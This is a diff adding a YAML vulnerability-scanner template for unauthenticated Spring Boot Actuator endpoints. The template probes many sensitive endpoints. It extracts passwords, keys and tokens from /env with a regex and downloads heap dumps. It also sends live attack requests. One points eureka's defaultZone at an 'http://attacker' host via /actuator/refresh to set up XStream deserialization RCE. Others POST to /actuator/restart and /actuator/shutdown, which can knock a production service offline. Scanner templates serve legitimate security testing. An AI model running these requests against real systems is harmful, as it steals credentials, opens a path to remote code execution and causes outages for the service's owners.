@@ -1,0 +1,521 @@
+id: spring-boot-actuator-unauth
+name: Spring Boot Actuator Unauthorized Access
+description: |
+  Spring Boot Actuator 端点未授权访问漏洞。
+  Actuator 是 Spring Boot 提供的自省和监控模块，
+  若未配置安全权限控制，攻击者可通过访问默认端点获取敏感信息：
+  - /env 泄露数据库密码、API 密钥等环境变量
+  - /trace 泄露 HTTP 请求跟踪信息
+  - /heapdump 下载 JVM 堆内存快照
+  - /jolokia 暴露 JMX，可执行任意 Java 操作
+  - /refresh + 恶意 eureka URL 可触发 XStream 反序列化 RCE
+severity: high
+author: gosleek
+tags: [springboot, actuator, exposure, unauth, rce]
+reference:
+  - https://cloud.tencent.com/developer/article/2169111
+  - https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
+  - https://spring.io/projects/spring-boot
+
+fingerprints:
+  - title: "Whitelabel Error Page"
+  - title: "Spring Boot"
+  - header: [Server, "nginx"]
+  - header: [X-Application-Context]
+
+http:
+  
+  - name: identify
+    probe: true
+    raw: |+
+      GET /favicon.ico HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+      Accept: image/webp,image/apng,*/*
+      Connection: close
+
+    timeout: 10
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words: ["<svg", "<path", "spring"]
+        case-insensitive: true
+        condition: or
+      - type: regex
+        part: body
+        regex: ["<svg[^>]*[^>]*>"]
+      - type: status
+        status: [200, 404]
+
+
+  - name: check-error-page
+    probe: true
+    raw: |+
+      GET /nonexistent-path-for-spring-boot-detect HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [404]
+      - type: word
+        part: body
+        words: ["Whitelabel Error Page", "There was an unexpected error", "Spring Boot"]
+        condition: or
+        case-insensitive: true
+  
+  - name: probe-env
+    raw: |+
+      GET /actuator/env HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["propertySources", "environ"]
+        condition: or
+      - type: word
+        part: body
+        words: ["password", "secret", "key", "token", "credential"]
+        condition: or
+        case-insensitive: true
+    extractors:
+      - name: env-secret
+        type: regex
+        part: body
+        regex: ['"(password|secret|key|token|credential)[^"]*"\s*:\s*"([^"]+)"']
+        group: 2
+
+  - name: probe-info
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/info HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["name", "description", "version", "git"]
+        condition: or
+
+  - name: probe-health
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/health HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["status", "UP", "DOWN", "details"]
+        condition: or
+
+  - name: probe-mappings
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/mappings HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["mappings", "endpoint", "controller"]
+        condition: or
+
+  - name: probe-heapdump
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/heapdump HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+    timeout: 15
+    matchers:
+      - type: status
+        status: [200]
+      - type: binary
+        part: body
+        binary: ["ACED0005"]  
+
+  - name: probe-configprops
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/configprops HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["configurationProperties", "properties"]
+        condition: or
+
+  - name: probe-threaddump
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/threaddump HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["threads", "threadName", "state"]
+        condition: or
+
+  - name: probe-trace
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/trace HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["traces", "timestamp", "method", "path"]
+        condition: or
+
+  - name: probe-jolokia
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/jolokia HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["jolokia", "agent", "version"]
+        condition: or
+
+  - name: probe-logfile
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/logfile HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["log", "Logback"]
+        case-insensitive: true
+        condition: or
+
+  - name: probe-features
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/features HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["features", "enabled"]
+        condition: or
+
+  - name: probe-scheduledtasks
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/scheduledtasks HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["scheduledTasks", "cron"]
+        condition: or
+
+  - name: probe-httptrace
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/httptrace HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["traces", "events", "request"]
+        condition: or
+
+  - name: probe-auditevents
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/auditevents HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["auditevents", "auditEvents"]
+        condition: or
+
+  - name: probe-flyway
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/flyway HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["flyway", "migrations"]
+        condition: or
+
+  - name: probe-liquibase
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/liquibase HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["liquibase", "changesets"]
+        condition: or
+
+  - name: probe-routes
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/routes HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["routes", "route"]
+        condition: or
+
+  - name: probe-liquibase-changelog
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /actuator/gateway/routes HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: application/json
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["routeDefinition", "id"]
+        condition: or
+
+  
+  - name: probe-env-old
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /env HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Accept: */*
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["propertySources", "activeProfiles"]
+        condition: or
+
+  - name: probe-heapdump-old
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /heapdump HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+    timeout: 15
+    matchers:
+      - type: status
+        status: [200]
+      - type: binary
+        part: body
+        binary: ["ACED0005"]
+
+  - name: probe-info-old
+    run-if: "{{env-secret}}"
+    raw: |+
+      GET /info HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["name", "version", "git"]
+        condition: or
+
+  
+  
+  - name: probe-refresh-rce
+    run-if: "{{env-secret}}"
+    raw: |+
+      POST /actuator/refresh HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+      {"eureka":{"client":{"serviceUrl":{"defaultZone":"http://attacker"}}}}
+
+    timeout: 15
+    matchers:
+      - type: status
+        status: [200, 500]
+      - type: word
+        part: all
+        words: ["eureka", "refreshed", "error"]
+        condition: or
+        case-insensitive: true
+
+  
+  - name: probe-restart
+    run-if: "{{env-secret}}"
+    raw: |+
+      POST /actuator/restart HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+      {}
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200, 405]
+      - type: word
+        part: body
+        words: ["restart", "重新启动"]
+        condition: or
+        case-insensitive: true
+
+  
+  - name: probe-shutdown
+    run-if: "{{env-secret}}"
+    raw: |+
+      POST /actuator/shutdown HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0
+      Connection: close
+
+      {}
+
+    timeout: 10
+    matchers:
+      - type: status
+        status: [200, 405]
+      - type: word
+        part: body
+        words: ["Shutting down", "shutdown", "Bye"]
+        condition: or
+        case-insensitive: true
